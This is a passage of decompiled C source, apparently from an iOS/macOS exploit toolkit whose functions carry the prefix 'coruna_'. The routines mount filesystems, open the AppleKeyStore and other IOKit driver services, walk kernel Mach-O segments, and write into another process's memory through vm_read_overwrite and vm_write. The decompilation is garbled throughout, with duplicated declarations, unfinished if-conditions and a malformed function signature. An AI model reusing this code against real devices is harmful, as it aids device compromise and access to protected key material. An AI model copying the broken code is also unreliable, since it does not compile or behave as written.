  sa_new = 0;
  action = 0;
  host_info = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  thread_attr = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  bootargs = 0;
  scratch = (unsigned long)size;
  path_buf = 0;
  scratch = val;
  err = _mount("apfs",path,size,&scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return;
  }
  ___stack_chk_fail(err);
}





int coruna_mount_hfs(uint64_t val,char *path,int flags)
{
  int err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  bootargs = 0;
  scratch = val;
  err = _mount("hfs",path,flags,&scratch);
  return err;
}





bool coruna_root_is_apfs(void)
{
  bool err;
  uint u;
  int err;
  char *ptr;
  unsigned long size;
  statfs *scratch;
  
  scratch = (statfs *)0x0;
  u = _getmntinfo(&scratch,0);
  err = false;
  if (u != 0) {
    size = (unsigned long)u;
    ptr = scratch->f_mntonname;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        err = _strncmp("apfs",ptr + -0x10,0x10);
        err = err == 0;
      }
      ptr = ptr + 0x878;
      size = size - 1;
    } while (size != 0);
  }
  return err;
}





uint64_t coruna_cfpropertylistcreatewithdata(long handle,uint size,char *path)
{
  uint8_t *ptr;
  bool err;
  int err;
  size_t ls4;
  long handle;
  void *ptr;
  long addr;
  long off;
  char *ptr;
  uint64_t u;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  mach_port_name_t host_info;
  long serial_buf;
  unsigned long action;
  long *block_ctx;
  uint64_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 100;
  bootargs = 0;
  err = coruna_mach_absolute_time_1b5b4(handle,0,&k_kernel_slot_2710);
  u = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot != sa_saved) {
  ___stack_chk_fail();
  }
  return u;
}





uint64_t
void coruna_kernel29bb0_via_return_zero_2b0c0(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            uint size)
{
  long handle;
  uint64_t u;
  uint scratch;
  
  scratch = 0;
  if ((size & 0xb) == 0) {
    u = 0;
  }
  else {
    handle = coruna_ret_stub_2();
    u = 0;
    if ((((handle != 0) && (handle = coruna_return_zero_2b0c0(val,handle), u = 0, handle != 0)) &&
        (u = coruna_call_mach_vm_machine_attribute_29df8_18d98(val,handle,4,&scratch), (int)u != 0)) &&
       (((scratch & size) == 0 &&
        (u = coruna_cfpropertylistcreatewithdata(val,id_2,size_3), (int)u != 0)))) {
      scratch = scratch | size;
      u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(val,handle,&scratch,4);
    }
  }
  return u;
}





void coruna_open_m2scaler(long *handle)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  uint64_t size;
  long off;
  uint32_t version;
  long *ptr;
  unsigned long scratch;
  long bootargs;
  uint64_t thread_attr;
  int host_info;
  
  off = *handle;
  ptr = (long *)handle[2];
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_28118_2(off,(int)handle[1]);
  if ((err != 0) && (handle = coruna_ptr_canonicalize(off,*(uint64_t *)(off + 0x390)), handle != 0)) {
    if (*(int *)(off + 0x140) < 0x1c1b) {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleM2ScalerCSCDriver");
      handle = 0;
    }
    else {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleKeyStore");
      err = coruna_ctx_test_flag(off,4);
      if (err != 0) {
        handle = 0;
      }
      else {
        handle = *(long *)(off + 0x3a8);
      }
    }
    if (1 < (int)u + 1U) {
      if (handle == 0) {
        err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
joined_r0x0000a220:
        version = 0;
        if (err == 0) {
          scratch = scratch & 0xffffffff00000000;
          handle = coruna_kernel29bb0_via_return_zero_28118(off,host_info);
          if ((handle == 0) ||
             (err = _IORegistryEntryGetChildIterator(u,"IOService",&scratch), err != 0)) {
            version = 0;
          }
          else {
          while( true ) {
            size = _IOIteratorNext(scratch & 0xffffffff);
            err = (int)size;
            if (err == 0) break;
            addr = coruna_kernel29bb0_via_return_zero_28118(off,size);
            if (handle == addr) {
              handle = 0;
              break;
            }
            _IOObjectRelease(size);
          }
          _IOObjectRelease(scratch & 0xffffffff);
          version = 0;
          if ((err != 0) && (handle != 0)) {
            handle = handle + 0x20;
            status = coruna_kernel29bb0_residual_193(off,handle,&thread_attr);
            if ((status != 0) &&
               (status = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,*(uint64_t *)(off + 0x390)), status != 0)) {
              status = _IORegistryEntryCreateCFProperties
                                (size,&bootargs,*(uint64_t *)k_kernel_kcfallocatordefault_slot,0)
              ;
              flags = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,thread_attr);
              if ((flags == 0) || (status != 0)) {
                if (bootargs != 0) {
                  _CFRelease();
                }
              }
              else if (bootargs != 0) {
                *ptr = bootargs;
                version = 1;
              }
            }
            version = 0;
          }
          if (1 < err + 1U) {
            _IOObjectRelease(size);
          }
          }
        }
      }
      else {
        err = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),0);
        if (err == 0) {
          version = 0;
        }
        else {
          err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
          status = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),handle);
          version = 0;
          if (status != 0) {
            err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
            version = 0;
            if (err == 0) goto joined_r0x0000a220;
          }
        }
      }
      if (1 < host_info + 1U) {
        scratch = 1;
        _IOServiceClose();
        _IOServiceWaitQuiet(u,&scratch);
      }
      _IOObjectRelease(u);
      *(uint32_t *)(handle + 3) = version;
      return;
    }
  }
  version = 0;
skip:
  *(uint32_t *)(handle + 3) = version;
  return;
}





unsigned long coruna_ptr_canonicalize(uint64_t arg,unsigned long val)

{
  if ((val & 7) != 0 || 0xffffffffeffe < val + 0x1000000000000) {
    val = 0;
  }
  return val;
}





unsigned long coruna_kernel29bb0_residual_161(long arg,unsigned long val)

{
  unsigned long port;
  long serial_7;
  unsigned long u;
  long *ptr;
  
  if (0xffffffffeffe < val + 0x1000000000000) {
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + arg);
    if (*(uint *)(&k_kernel_slot_18a0 + arg) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + arg);
      do {
        port = ptr[-1];
        serial_7 = *ptr;
        if ((((port != 0 && serial_7 != 0) && port <= val) && val <= serial_7 + port) &&
            (((port == 0 || serial_7 == 0) || val < port) || serial_7 + port != val)) {
          return val;
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
    val = 0;
  }
  return val;
}



coruna_svc_regpack_t coruna_kernel29bb0_residual_162(long *arg)

{
  long off;
  unsigned long tag;
  long *buf;
  long addr;
  unsigned long kind;
  unsigned long *buf;
  uint8_t version[16];
  
  buf = (long *)*arg;
  off = arg[1];
  addr = *buf + (unsigned long)*(uint *)(buf + 0x19) * 0x38;
  if ((unsigned long)(off - *(long *)(addr + 0x20)) < *(unsigned long *)(addr + 0x28)) {
fail:
    if (*(char *)((long)buf + 0x101) != '\0') {
      buf = (long *)buf[0x15];
    }
    kind = off - buf[0x1e];
    if (((unsigned long)buf[0x16] <= kind) &&
       version = tag;
       version = kind;
       return version;
  }
  else if (*(uint *)(buf + 1) != 0) {
    kind = 0;
    buf = (unsigned long *)(*buf + 0x28);
    do {
      if (off - buf[-1] < *buf) {
        *(int *)(buf + 0x19) = (int)kind;
        if (*(char *)((long)buf + 0x101) != '\0') {
        buf = (long *)buf[0x15];
        }
        kind = off - buf[0x1e];
        if (((unsigned long)buf[0x16] <= kind) &&
        version = tag;
        version = kind;
        return version;
      }
      kind = kind + 1;
      buf = buf + 7;
    } while (*(uint *)(buf + 1) != kind);
  }
  kind = 0;
  tag = 0;
done:
  version = tag;
  version = kind;
  return version;
}





uint64_t coruna_sizeof_ptr(void)
{
  return 8;
}





kern_return_t coruna_vm_allocate(long handle)
{
  size_t ls1;
  kern_return_t lk2;
  unsigned long u;
  vm_address_t scratch;
  
  if (*(char *)(handle + 0x101) == '\0') {
    if (((*(byte **)(handle + 0x108) == (byte *)0x0) ||
        (scratch = *(vm_address_t *)(handle + 0xb0), scratch == 0)) ||
       (*(vm_size_t *)(handle + 0xb8) == 0)) {
      return 4;
    }
    if ((**(byte **)(handle + 0x108) >> 1 & 1) != 0) {
      lk2 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                           *(vm_size_t *)(handle + 0xb8),0x4000);
      if (lk2 != 0) {
        return lk2;
      }
      u = (unsigned long)*(int *)(handle + 0x38);
      ls1 = 0;
      if (u != 0) {
        ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
      }
      _bzero(*(void **)(handle + 0x108),ls1);
    }
  }
  return 0;
}





uint64_t coruna_kernel29bb0_via_nop_stub(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint size)
{
  int err;
  uint u;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  
  handle = handle;
  if (*(char *)(handle + 0x101) != '\0') {
    handle = *(long *)(handle + 0xa8);
  }
  kind = *(unsigned long *)(handle + 0xb0);
  if ((arg < kind) || (*(long *)(handle + 0xb8) + kind < arg + arg)) {
    size = 3;
  }
  else {
    size = 0;
    port = (unsigned long)-*(int *)(handle + 0x38);
    tag = port & arg;
    port = ((long)*(int *)(handle + 0x38) + arg + arg) - 1 & port;
    if (tag < port) {
      type_id = (unsigned long)*(int *)(handle + 0x38);
      do {
        version = 0;
        if (type_id != 0) {
          version = (tag - kind) / type_id;
        }
        if (((*(byte *)(*(long *)(handle + 0x108) + version) & 1) == 0) || ((size & 1) != 0)) {
          err = coruna_return_zero_1cf78(*(uint64_t *)(handle + 0x118));
          if (((err != 0) &&
              (((err = coruna_kernel29478_residual_162(*(uint64_t *)(handle + 0x118)), err != 0 &&
                (u = coruna_nop_stub(*(uint64_t *)(handle + 0x118)),
                *(uint *)(handle + 0x38) < u)) &&
               (version = coruna_nop_stub(*(uint64_t *)(handle + 0x118)),
               port - tag < (version & 0xffffffff))))) && (arg < val)) {
            port = ((long)*(int *)(handle + 0x38) + arg + val) - 1 &
                    (long)-*(int *)(handle + 0x38);
            version = coruna_nop_stub(*(uint64_t *)(handle + 0x118));
            if (tag + (version & 0xffffffff) < port) {
              port = coruna_nop_stub(*(uint64_t *)(handle + 0x118));
              port = tag + (port & 0xffffffff);
            }
          }
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(*(uint64_t *)(handle + 0x118),
                               (*(long *)(handle + 0xe0) - kind) + tag,port - tag,tag);
          if (err != 0) {
            if (tag < port) {
              do {
                version = 0;
                if (type_id != 0) {
                  version = (tag - kind) / type_id;
                }
                *(byte *)(*(long *)(handle + 0x108) + version) =
                     *(byte *)(*(long *)(handle + 0x108) + version) | 1;
                tag = tag + type_id;
              } while (tag < port);
            }
            **(byte **)(handle + 0x108) = **(byte **)(handle + 0x108) | 2;
            return 0;
          }
          return 5;
        }
        tag = tag + type_id;
      } while (tag < port);
      size = 0;
    }
  }
  return size;
}





void coruna_call_mach_vm_machine_attribute_29df8(void)
{
  coruna_kernel29bb0_via_nop_stub();
  return;
}





uint32_t coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(uint64_t val,uint64_t id_2)
{
  uint32_t u;
  uint32_t *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 4;
  scratch = val;
  scratch = id_2;
  ptr = (uint32_t *)coruna_kernel29bb0_residual_162(&scratch,1);
  u = 0;
  if (ptr != (uint32_t *)0x0) {
    coruna_kernel29bb0_via_nop_stub(val,ptr,4,0,0);
    u = *ptr;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_nop_stub_2(uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 8;
  scratch = val;
  scratch = id_2;
  ptr = (uint64_t *)coruna_kernel29bb0_residual_162(&scratch,1);
  u = 0;
  if (ptr != (uint64_t *)0x0) {
    coruna_kernel29bb0_via_nop_stub(val,ptr,8,0,0);
    u = *ptr;
  }
  return u;
}





void coruna_macho_find_loadcmd(long *handle,long addr_2,char *path)
{
  int *err;
  int *status;
  int err;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  while( true ) {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if ((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0))
    break;
  }
  *handle = addr_2;
  handle = *(long *)(err + 6);
  handle[2] = *(long *)(err + 8);
  handle[1] = handle;
  return;
}





void coruna_macho_map_segsect(long *handle,long addr_2,char *path,char *str_2)
{
  int *err;
  int *status;
  int err;
  int *flags;
  unsigned long u;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  do {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if (((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0)) &&
       (u = (unsigned long)(uint)err[0x10], err[0x10] != 0)) {
      flags = err + 0x12;
      do {
        err = _strncmp((char *)flags,str_2,0x10);
        if (err == 0) {
          *handle = addr_2;
          handle = *(long *)(flags + 8);
          handle[2] = *(long *)(flags + 10);
          handle[1] = handle;
          return;
        }
        flags = flags + 0x14;
        u = u - 1;
      } while (u != 0);
    }
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
  } while( true );
}





void coruna_macho_text_sect(long handle)
{
  coruna_macho_map_segsect(handle,*(uint64_t *)(handle + 0x110),"__text");
  return;
}





uint64_t coruna_return_zero_11fd4(long handle,char *path,unsigned long arg)
{
  int *err;
  int *status;
  size_t ls3;
  uint u;
  int err;
  uint size;
  
  err = (int *)(**(long **)(handle + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(handle + 0xd0) + 0x14));
  do {
    if (status <= err) {
      return 0;
    }
    if (*err == -0x7fffffcb) {
      u = err[6];
      size = err[1];
      if (0x1f < u && u < size) {
        ls3 = arg;
        if (size - u <= arg) {
          ls3 = (unsigned long)(size - u);
        }
        err = _strncmp((char *)((long)err + (unsigned long)u),path,ls3);
        if (err == 0) {
          return *(uint64_t *)(err + 2);
        }
      }
    }
    else {
      size = err[1];
    }
    err = (int *)((long)err + (unsigned long)size);
  } while( true );
}





void coruna_ctx_clear_1090c(uint64_t *val,uint64_t id_2)
{
  val[0x21] = 0;
  val[0x20] = 0;
  val[0x23] = 0;
  val[0x22] = 0;
  val[0x1d] = 0;
  val[0x1c] = 0;
  val[0x1f] = 0;
  val[0x1e] = 0;
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[0x23] = id_2;
  val[0x24] = 0;
  return;
}





uint64_t coruna_vm_deallocate_120b8(long handle)
{
  kern_return_t lk1;
  uint64_t u;
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xb0);
  if (((address == 0) || (*(vm_size_t *)(handle + 0xb8) == 0)) ||
     (lk1 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,
                             *(vm_size_t *)(handle + 0xb8)), lk1 != 0)) {
    u = 0;
  }
  else {
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
    u = 1;
  }
  return u;
}





bool coruna_vm_deallocate_1210c(long handle)
{
  size_t ls1;
  uint8_t *ptr;
  bool err;
  kern_return_t lk4;
  void *ptr;
  unsigned long u;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk4 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                  *(vm_size_t *)(handle + 0xe8),(long)*(int *)(handle + 0x38) - 1,1,0,0,0,3,1,
                  in_stack_ffffffffffffffd0);
  err = false;
  if (lk4 == 0) {
    if ((*(vm_address_t *)(handle + 0xb0) != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xb0),
                     *(vm_size_t *)(handle + 0xb8));
    }
    *(vm_address_t *)(handle + 0xb0) = scratch;
    *(long *)(handle + 0xb8) = *(long *)(handle + 0xe8);
    *(vm_address_t *)(handle + 0xf0) = *(long *)(handle + 0xe0) - scratch;
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    ptr = _calloc(ls1,1);
    *(void **)(handle + 0x108) = ptr;
    err = ptr != (void *)0x0;
  }
  return err;
}





uint64_t coruna_macho_text_seg(long handle,long addr_2)
{
  size_t ls1;
  int err;
  void *ptr;
  uint64_t u;
  int *err;
  uint8_t size;
  unsigned long version;
  long *buf;
  int *status;
  long handle;
  int *flags;
  uint8_t scratch[20];
  uint bootargs;
  
  ptr = _calloc(0x48,1);
  *(void **)(handle + 0xd0) = ptr;
  if (ptr == (void *)0x0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_18d98(*(uint64_t *)(handle + 0x118),addr_2,0x20,scratch);
  if ((int)u == 0) {
    return u;
  }
  ls1 = (unsigned long)bootargs + 0x20;
  err = _calloc(ls1,1);
  if (err == (int *)0x0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_18d98(*(uint64_t *)(handle + 0x118),addr_2,ls1,err);
  if ((int)u == 0) {
    return u;
  }
  **(uint64_t **)(handle + 0xd0) = err;
  if (*err == -0x1120532) {
    size = 4;
  }
  else {
    if (*err != -0x1120531) {
      return 0;
    }
    size = 8;
  }
  *(uint8_t *)(handle + 0x34) = size;
  if (ls1 < err[5] + 0x20) {
    return 0;
  }
  status = err + 8;
  err = (int *)((long)status + (unsigned long)(uint)err[5]);
  if (err <= status) {
    return 1;
  }
  handle = 0;
  flags = status;
  do {
    if ((*flags == 0x19) && (err = _strcmp((char *)(flags + 2),"__TEXT"), err == 0)) {
      handle = addr_2 - *(long *)(flags + 6);
    }
    flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
  } while (flags < err);
  if (handle == 0) {
    return 1;
  }
  if (err <= status) {
    return 1;
  }
  do {
    if (*status == 0x19) {
      version = (unsigned long)(uint)status[0x10];
      if (status[0x10] != 0) {
        buf = (long *)(status + 0x1a);
        do {
          *buf = *buf + handle;
          version = version - 1;
          buf = buf + 10;
        } while (version != 0);
      }
      *(long *)(status + 6) = *(long *)(status + 6) + handle;
    }
    status = (int *)((long)status + (unsigned long)(uint)status[1]);
  } while (status < err);
  return 1;
}





bool coruna_call_find_text_exec(void)
{
  int err;
  
  err = coruna_find_kld_segment();
  return err != 0;
}





unsigned long coruna_find_kld_segment(long *arg,uint32_t val,unsigned long n,uint64_t m)

{
  uint8_t (*lpau1) [16];
  int *status;
  int *flags;
  uint size;
  bool count;
  int flags;
  unsigned long type_id;
  long *str;
  uint type_id_8;
  unsigned long type_id_9;
  unsigned long type_id_10;
  int *count;
  uint type_id_11;
  uint type_id_12;
  long serial_8;
  unsigned long type_id_13;
  unsigned long type_id_14;
  long serial_9;
  uint8_t port[16];
  uint8_t action[16];
  long scratch;
  
  type_id = coruna_macho_text_seg(arg,n);
  if ((int)type_id == 0) {
    return type_id;
  }
  *(uint32_t *)(arg + 0x1b) = val;
  *(uint8_t *)(arg + 0x20) = 1;
  serial_8 = *(long *)arg[0x1a];
  count = (int *)(serial_8 + 0x20);
  type_id_12 = *(uint *)(serial_8 + 0x14);
  flags = (int *)((long)count + (unsigned long)type_id_12);
  if ((count < flags && (int *)(serial_8 + 0x28U) <= flags) && count <= flags + -2) {
    type_id_8 = 0;
    while( true ) {
      size = count[1];
      if ((size < 8) || ((unsigned long)((long)flags - (long)count) < (unsigned long)size)) break;
      flags = *count;
      type_id_11 = 0x18;
      if (flags < 0xb) {
        if (flags != -0x7fffffe1) {
          type_id_11 = 0x30;
          }
          else {
          count = (int *)((long)count + (unsigned long)size);
          if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
          count = (int *)((long)count + (unsigned long)size);
          if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
        }
        if (size < type_id_11) break;
      }
      else {
        if (0x18 < flags) {
          if (flags == 0x22) {
            type_id_11 = 0x30;
          }
          else {
            count = (int *)((long)count + (unsigned long)size);
            if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
            type_id_8 = type_id_8 + 1;
            type_id_11 = 0x48;
          }
          if (size < type_id_11) break;
        }
        else if (flags == 0xb) {
          type_id_11 = 0x50;
          if (size < type_id_11) break;
        }
        else if (flags == 0xd) {
          if (size < type_id_11) break;
        }
      }
      count = (int *)((long)count + (unsigned long)size);
      if (((flags <= count) || (flags < count + 2)) || (flags + -2 < count)) break;
    }
    if (type_id_8 != 0) {
      *(uint *)(arg + 1) = type_id_8;
      str = _malloc((unsigned long)type_id_8 * 0x38);
      *arg = (long)str;
      if (str == (long *)0x0) {
        return 0;
      }
      arg[0x22] = (long)"__TEXT";
      count = (int *)(serial_8 + 0x20);
      flags = (int *)((long)count + (unsigned long)type_id_12);
      if (count < flags) {
        do {
          if (*count == 0x19) {
            if (((unsigned long)(uint)count[1] - 0x48) / 0x50 < (unsigned long)(uint)count[0x10]) {
              return 0;
            }
            flags = _strcmp((char *)(count + 2),"__TEXT_EXEC");
            if (flags == 0) {
              arg[0x22] = (long)"__TEXT_EXEC";
            }
            serial_9 = *(long *)(count + 0xc);
            serial_8 = *(long *)(count + 10);
            *str = (long)arg;
            str[2] = serial_9;
            str[1] = serial_8;
            serial_9 = *(long *)(count + 8);
            serial_8 = *(long *)(count + 6);
            str[3] = (long)arg;
            str[5] = serial_9;
            str[4] = serial_8;
            str[6] = (long)count;
            str = str + 7;
          }
          count = (int *)((long)count + (unsigned long)(uint)count[1]);
        } while (count < flags);
        serial_8 = *(long *)arg[0x1a];
      }
      serial_9 = NEON_rev64(*(uint64_t *)(serial_8 + 4),4);
      arg[5] = serial_9;
      *(uint32_t *)(arg + 6) = *(uint32_t *)(serial_8 + 0x18);
      type_id_12 = (uint)m;
      if ((type_id_12 >> 8 & 1) != 0) {
        coruna_macho_map_segsect(action,arg,"__TEXT","__thread_starts");
        if (scratch != 0) {
          *(uint8_t *)((long)arg + 0x9c) = 1;
        }
        if ((((type_id_12 >> 10 & 1) != 0) && (*arg != 0)) &&
           (serial_8 = *(long *)(*arg + 8), serial_8 != 0)) {
          arg[0x14] = n - serial_8;
        }
      }
      if ((type_id_12 >> 6 & 1) != 0) {
        return 1;
      }
      count = (int *)(*(long *)arg[0x1a] + 0x20);
      flags = (int *)((long)count + (unsigned long)*(uint *)(*(long *)arg[0x1a] + 0x14));
      if (count < flags) {
        type_id = 0;
        count = false;
        type_id_9 = (long)(int)arg[7] - 1;
        type_id_14 = n;
        do {
          type_id_10 = type_id_14;
          if (*count == 0x19) {
            status = count + 2;
            flags = _strcmp((char *)status,"__TEXT");
            if (flags == 0) {
              arg[0x1f] = n - *(long *)(count + 6);
            }
            if (((type_id_12 >> 8 & 1) != 0) && (flags = _strcmp((char *)status,"__KLD"), flags == 0)) {
              count = true;
            }
            type_id_13 = type_id;
            if ((((type_id_12 & 0x580) != 0x180) && (*(long *)(count + 8) != 0)) &&
               (type_id_13 = *(long *)(count + 6) + *(long *)(count + 8), type_id_13 <= type_id)) {
              type_id_13 = type_id;
            }
            if ((((type_id_12 >> 10 & 1) != 0) && (*(long *)(count + 8) != 0)) &&
               (type_id_10 = *(unsigned long *)(count + 6), type_id_14 <= type_id_10 || type_id_10 == 0)) {
              type_id_10 = type_id_14;
            }
            flags = _strcmp((char *)status,"__LINKEDIT");
            type_id = type_id_13;
            if (flags == 0) {
              lpau1 = (uint8_t (*) [16])(count + 8);
              port = NEON_ext(*lpau1,*lpau1,8,1);
              type_id = *(long *)*lpau1 + *(long *)(count + 6);
              if ((type_id_12 & 0x580) != 0x180) {
                type_id = type_id_13;
              }
              arg[2] = *(long *)(count + 6);
              arg[4] = port;
              arg[3] = port;
            }
          }
          count = (int *)((long)count + (unsigned long)(uint)count[1]);
          type_id_14 = type_id_10;
        } while (count < flags);
        if (((uint)!count & type_id_12 >> 8) != 0) {
          return 0;
        }
        if (type_id == 0) {
          return 0;
        }
        if ((((type_id_12 ^ 0xffffffff) & 0x500) == 0) && (arg[0x14] != 0)) {
          type_id_10 = arg[0x14];
        }
        if (type_id_10 != n) {
          n = type_id_10 & (type_id_9 ^ 0xffffffffffffffff);
        }
        type_id = type_id + type_id_9 & (type_id_9 ^ 0xffffffffffffffff);
        if (n <= type_id) {
          arg[0x1c] = n;
          arg[0x1d] = type_id - n;
          flags = coruna_vm_deallocate_1210c(arg,m);
          return (unsigned long)(flags != 0);
        }
      }
    }
  }
  return 0;
}





bool coruna_call_find_text_exec_11034(void)
{
  int err;
  
  err = coruna_find_kld_segment();
  return err != 0;
}





void coruna_kernel09_via_vm_deallocate_120b8(uint64_t *val)
{
  uint64_t *ptr;
  
  coruna_vm_deallocate_120b8();
  ptr = (uint64_t *)val[0x1a];
  if (ptr != (uint64_t *)0x0) {
    if ((void *)*ptr != (void *)0x0) {
      _free((void *)*ptr);
      ptr = (uint64_t *)val[0x1a];
      *ptr = 0;
    }
    _free(ptr);
    val[0x1a] = 0;
  }
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
    *val = 0;
  }
  if ((void *)val[0x21] != (void *)0x0) {
    _free((void *)val[0x21]);
    val[0x21] = 0;
  }
  return;
}





uint64_t coruna_vm_read_write(uint64_t val)
{
  unsigned long *address;
  int err;
  kern_return_t lk2;
  vm_map_t target_task;
  vm_size_t scratch;
  unsigned long bootargs;
  long thread_attr;
  
  err = coruna_task_dyld_info(val,&thread_attr);
  if (err == 0) {
    address = (unsigned long *)(thread_attr + 0x28);
    target_task = (vm_map_t)val;
    if (*(vm_map_t *)k_kernel_mach_task_self_slot == target_task) {
      *address = *address | 1;
      return 1;
    }
    lk2 = _vm_read_overwrite(target_task,(vm_address_t)address,8,(vm_address_t)&bootargs,
                               &scratch);
    if (lk2 == 0) {
      bootargs = bootargs | 1;
      lk2 = _vm_write(target_task,(vm_address_t)address,(vm_offset_t)&bootargs,8);
      if (lk2 == 0) {
        return 1;
      }
    }
  }
  return 0;
}





kern_return_t coruna_task_dyld_info(task_name_t arg,long *handle)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  long bootargs [3];
  
  scratch = 5;
  lk1 = _task_info(arg,0x11,(task_info_t)bootargs,&scratch);
  if (lk1 == 0) {
    if (bootargs[0] == 0) {
      lk1 = 5;
    }
    else {
      lk1 = 0;
      *handle = bootargs[0];
    }
  }
  return lk1;
}





uint64_t coruna_task_get_special_port(long handle,uint32_t *size)
{
  int err;
  kern_return_t lk2;
  long handle;
  long scratch;
  unsigned long bootargs;
  mach_msg_type_number_t thread_attr;
  mach_port_t host_info;
  task_t serial_buf;
  
  thread_attr = 5;
  host_info = 0;
  err = coruna_voucher_create(handle,0x1122334455667788,&serial_buf);
  if (err != 0) {
    *size = 0;
    lk2 = _task_get_special_port(serial_buf,1,&host_info);
    host_info = serial_buf;
    if (lk2 != 0) {
      return 1;
    }
    if (serial_buf + 1 < 2) {
      return 1;
    }
    *size = 1;
    *(task_t *)(&k_kernel_slot_1918 + handle) = serial_buf;
    lk2 = _task_info(serial_buf,0x11,(task_info_t)&scratch,&thread_attr);
    if (((lk2 == 0) && (scratch != 0)) && (handle = coruna_ptr_canonicalize(handle,scratch), handle != 0)) {
      *(long *)(&k_kernel_slot_19d0 + handle) = scratch;
      if ((bootargs != 0) && ((*(unsigned long *)(handle + 0x188) & bootargs) == 0)) {
        *(unsigned long *)(&k_kernel_slot_19e0 + handle) = bootargs;
      }
      return 1;
    }
  }
  return 0;
}





uint coruna_mach_port_deallocate_eb24(uint64_t val,unsigned long arg,vm_size_t arg_x,vm_address_t *arg_x_x)
{
  int err;
  uint u;
  mem_entry_name_port_t name;
  vm_inherit_t unaff_w22;
  uint size;
  mem_entry_name_port_t scratch;
  
  scratch = 0;
